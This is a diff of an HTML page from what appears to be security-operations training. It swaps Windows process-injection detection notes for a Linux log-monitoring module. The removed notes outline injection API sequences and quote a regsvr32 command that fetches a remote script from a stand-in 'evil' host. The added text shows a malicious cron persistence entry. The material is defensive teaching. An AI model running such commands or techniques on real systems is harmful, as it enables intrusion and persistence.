@@ -1,33 +1,27 @@
 <div class="p-4 rounded mb-4" style="background:rgba(17,24,39,0.9);border:1px solid #1f2937;">
-<h6 class="text-danger mb-3"><i class="bi bi-book me-2"></i>Elaborated Notes with Examples</h6>
+<h6 class="text-success mb-3"><i class="bi bi-book me-2"></i>Module 10: Linux Security Monitoring</h6>
 
-<h6 class="text-danger mt-3">1. Process Injection — CreateRemoteThread</h6>
-<p><code>CreateRemoteThread</code> is a classic process injection technique. The attacker uses <code>OpenProcess</code> to get a handle to a target process (e.g., explorer.exe, svchost.exe), <code>VirtualAllocEx</code> to allocate memory, <code>WriteProcessMemory</code> to write shellcode, then <code>CreateRemoteThread</code> to execute it in the target process context.</p>
+<h6 class="text-success mt-3">Sub-Domains / Rooms</h6>
+<ul style="color:#c0d0e0;">
+  <li><b>Linux Logging for SOC</b> — Understand syslog, auth.log, secure log, dmesg, and auditd for monitoring Linux systems.</li>
+  <li><b>Linux Threat Detection 1</b> — Detect SSH brute force, user enumeration, and unauthorized sudo usage from auth logs.</li>
+  <li><b>Linux Threat Detection 2</b> — Identify reverse shells, cron job abuse, and file integrity changes on Linux endpoints.</li>
+  <li><b>Linux Threat Detection 3</b> — Investigate kernel-level threats, rootkits, and persistence via systemd services and LD_PRELOAD.</li>
+</ul>
+
 <div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example (Sysmon Event 8):</b> Event ID 8 (CreateRemoteThread) shows <code>SourceImage: C:\Users\victim\malware.exe</code>, <code>TargetImage: C:\Windows\System32\svchost.exe</code> with <code>StartAddress: 0x7FFA12340000</code> which is within the malware's allocated memory region (<code>VirtualAllocEx</code> allocation at <code>0x7FFA12340000</code>). The WMI filter in Sysmon catches CreateRemoteThread where the calling process is not signed Microsoft. EDR alert: "Remote Thread Injection Detected in svchost.exe."
+<b>Example Detection:</b><br>
+<code>/var/log/auth.log</code> shows 3000 failed SSH attempts from IP 45.33.32.156 in 5 minutes — brute force attack.<br>
+<code>/var/log/syslog</code> shows a cron job running every minute: <code>*/1 * * * * /tmp/.hidden/updater.sh</code> — persistence.<br>
+<code>audit.log</code> shows <code>auid=1000, uid=0, comm="bash"</code> — privilege escalation to root.<br>
+The analyst checks <code>.bash_history</code> and finds the attacker downloaded a reverse shell, escalated to root via CVE-2021-4034 (PwnKit), and installed a systemd service for persistence.
 </div>
 
-<h6 class="text-danger mt-3">2. APC Injection</h6>
-<p>Asynchronous Procedure Call (APC) injection queues a malicious APC routine to a thread's APC queue. When the thread enters an alertable state (e.g., calling <code>WaitForSingleObjectEx</code>), the APC fires. Common targets: <code>svchost.exe</code>, <code>explorer.exe</code>, the <code>ntdll!NtTestAlert</code> path.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example (Sysmon Event 8):</b> <code>SourceImage: C:\Users\victim\malware.exe</code> uses <code>QueueUserAPC</code> to inject into <code>explorer.exe</code> thread ID 1234. Both Sysmon Event 8 and 25 (Process Tampering) fire. The APC start address points to a <code>C:\Windows\Temp\malicious.dll</code> that was written 2 seconds earlier. In memory analysis with Volatility: <code>apcScan</code> shows kernel APC objects queued to explorer.exe threads. The APC code decrypts C2 configuration at runtime.
-</div>
-
-<h6 class="text-danger mt-3">3. Process Hollowing</h6>
-<p>Process hollowing replaces the legitimate memory of a process (e.g., <code>svchost.exe</code> launched in a suspended state) with malicious code using <code>NtUnmapViewOfSection</code> or <code>ZwUnmapViewOfSection</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, and <code>ResumeThread</code>.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example (Sysmon Event 1 + 8):</b> <code>Event ID 1: svchost.exe (PID: 3456) created by malware.exe (PID: 1234) with command line "C:\Windows\System32\svchost.exe -k netsvcs"</code>. The entry point is suspicious: <code>0x1000</code> instead of the usual <code>0x1C0000</code> range for legitimate svchost. <code>Event ID 8</code> shows a thread starting at <code>0x1000</code> in PID 3456. The malware hollowed out the fresh svchost process and injected its own code.
-</div>
-
-<h6 class="text-danger mt-3">4. Detection & Remediation</h6>
-<p>Detection: Sysmon Events 1 (process creation), 8 (CreateRemoteThread), 10 (process access), 11 (file create), and 12-14 (registry events). EDR hooks critical APIs (NtCreateThreadEx, NtQueueApcThread). Memory scanning detects injected code regions. Remediation: kill malicious processes, remove persistence, isolate host, rebuild from known-good image.</p>
-<div class="bg-dark p-2 rounded small mb-2" style="border:1px solid #333;">
-<b>Example Detection:</b> EDR alert: "Process Injection — CreateRemoteThread detected." Investigation shows:<br>
-- Source: <code>outlook.exe (PID 4000)</code> — Office product, unusual parent for injection.<br>
-- Target: <code>regsvr32.exe (PID 5000)</code> — spawned by Outlook with <code>/s /n /u /i:hxxp://evil/script.sct</code> (SCT file-based execution).<br>
-- Sysmon Event 1 shows the command line.<br>
-- Sysmon Event 13 shows <code>regsvr32.exe</code> accessing <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>.<br>
-<b>Remediation:</b> Isolate both endpoints. Kill PID 5000 and 4000. Remove registry key. Reset the user's password. Scan for additional implants. Block <code>evil[.]com</code> on the firewall. Submit sample to sandbox for full analysis.
-</div>
-
+<h6 class="text-success mt-3">Key Skills Learned</h6>
+<ul style="color:#c0d0e0;">
+  <li>Linux log file analysis (auth.log, syslog, audit.log)</li>
+  <li>SSH brute force detection</li>
+  <li>Reverse shell and persistence detection</li>
+  <li>Linux privilege escalation identification</li>
+</ul>
 </div>
